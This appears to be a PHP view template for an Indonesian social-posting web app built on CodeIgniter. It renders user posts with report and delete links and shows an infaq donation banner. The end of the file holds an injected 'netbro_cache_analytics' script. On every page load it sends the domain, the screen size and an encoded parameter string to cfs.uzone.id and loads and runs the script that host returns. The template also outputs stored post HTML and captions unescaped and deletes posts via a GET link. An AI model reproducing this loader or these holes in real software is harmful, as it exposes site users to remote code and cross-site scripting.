<!-- Post Content

================================================= -->


<?=$this->session->flashdata('mm');?>

<?php foreach ($posting as $pst): ?>

<div class="post-content">

    <input type="hidden" value="<?=$pst->id_posting;?>" id="id_post">



    <?=$pst->html;?>

    <?php if ($pst->id_user != $this->session->userdata('id')): ?>

    <?php if ($pst->id_user != $this->session->userdata('id')): ?>
    <form method="post" action="<?=base_url('User/addReport');?>">
        <input type="hidden" name="id_posting" value="<?=$pst->id_posting;?>">
        <input type="hidden" name="id" value="<?=$this->session->userdata('id');?>">
        <a class="btn text-red">
            <button class="" style="border : 0;background-color: transparent;" name="report"><i
                    class="fas fa-exclamation"></i>
                Laporkan! </button> </a>
    </form>
    <?php elseif ($pst->id_user != $this->session->userdata('id') and $rpt->report == 1): ?>

    <?php endif;?>

    <?php else: ?>

    <i class="fas fa-trash" style="color: tomato;margin-left:18px;"></i>
    <a href="<?=base_url();?>user/deletePost/<?=$pst->id_posting . '/' . $pst->fileName?>"
        style="text-decoration:none;">Hapus</a>

    <?php endif;?>

    <!-- <?=$pst->image?> -->

    <div class="post-container">
        <img src="<?=base_url('assets_user/');?>images/<?=$pst->image?>" alt="user"
            class="profile-photo-md pull-left" />
        <div class="post-detail">
            <div class="user-info">
                <h5><?php if ($pst->id == $this->session->userdata('id')): ?>
                    <a href="<?=base_url('profile/')?>"><?=$pst->name;?></a>
                    <?php else: ?>
                    <a href="<?=base_url('friend/visitProfile/') . $pst->id_user;?>"><?=$pst->name;?></a>
                    <?php endif;?>
                </h5>
                <p class="text-muted">Diunggah pada <?=date('d F Y ', $pst->date_post);?></p>
            </div>
            <div class="line-divider"></div>
            <div class="post-text">
                <p><?=$pst->caption;?> </p>
            </div>
            <div class="line-divider"></div>
            <?=$this->session->flashdata('nn');?>


            <div class="post-comment">
                <a href="<?=base_url('user/getIdposting/') . $pst->id_posting;?>">Lihat detail unggahan</a>
            </div>
        </div>
    </div>
</div>

<?php endforeach;?>





<!-- Post Content=================================================-->


</div>

<script src="<?=base_url('assets_user/js/search.js');?>"></script>

<?php
$shown = "";
if ($this->session->role_id == 3) {
    $shown = "hide";
} else {
    $shown = "show";
}?>

<div id="snackbar" class="<?=$shown?>">

    <button type="button" id="close" class="close" data-dismiss="alert" aria-label="Close" style="color: white;">
        <span aria-hidden="true" onclick="myFunction()">&times;</span>
    </button>


    <p>Sudah kah kamu infaq hari ini?<br>
        jika belum, <a href="<?=base_url('infaq')?>" class="text-red">klik disini</a> untuk infaq</p>


</div>





<script type="text/javascript">
if (self == top) {
    function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
            fn();
            callback();
        }, 0);
    }

    function sync(fn) {
        fn();
    }

    function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
            "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxgfvjefwcdpi3BR90FnQrXwyyfCTDb8E2di%2fELZdFcaQDCb4sEyVDeTd8ej5SFMh%2b7xyrzblfQFOXTUXf9iN32Ab9iiJ2EpDdADb8Pv0GHv1kURtIeaOiDyjJyYbPUfYgP%2bVgsl8ln0cuzZNAIKby3S%2fpQrnexuB635Gi9zTRaH2HlNoKc%2bSPuJ7kNdPIqXX%2fAIlau%2fUfKQYBHD527gIcOE3q2TQ0hhCAgSyqHzzUfXQK2wC%2bq4RuZ%2fzOiipvNxE0YTg878qSdfUFPRlPqJqva3TEtq9qz%2blbk30gBRXL6wJOlco56Bbe8beu%2bhJ9Ocx0ZOx1fBw6kqmsuriz2rmD6qwqTNAkoRGU9GD2F3XG3SB%2fw5BN2tGboFc%2fOpAII6Gmj8P12MvyhRwYZNEeoGq4YTLTtgSZL%2bsPa2O3Qkrq%2fRwktYVwi4g8rS2DY3M1qTsoMQPMug95776MKZOZKimLgPJnSoJGOJ9p5MBsdXuqe0%3d" +
            "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
};
</script>

<script>
$(document).ready(function() {
    $('.toast').toast('show');
});
</script>